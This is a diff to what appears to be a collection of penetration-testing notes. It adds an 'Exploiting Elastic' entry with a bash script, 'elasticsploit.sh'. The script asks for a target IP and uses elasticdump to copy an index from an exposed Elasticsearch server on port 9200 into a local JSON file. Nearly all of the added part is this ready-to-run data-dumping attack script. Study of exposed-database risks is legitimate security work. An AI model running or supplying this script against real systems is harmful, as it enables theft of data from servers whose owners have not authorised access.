@@ -214,3 +214,19 @@ curl http://127.0.0.1:1234
 
 ### [Hacking docker registry]
 https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
+
+### [Exploiting Elastic]
+```
+Bash Script:
+
+elasticsploit.sh:
+read -p 'Enter IP Address only: ' site
+read -p 'Enter filename: ' filename
+
+elasticdump \
+  --input=http://$site:9200/quotes \
+  --output=$filename.json \
+  --type=data
+echo "-------------------------------------"
+echo $filename".json jhas been dumped into the currently directory"
+```
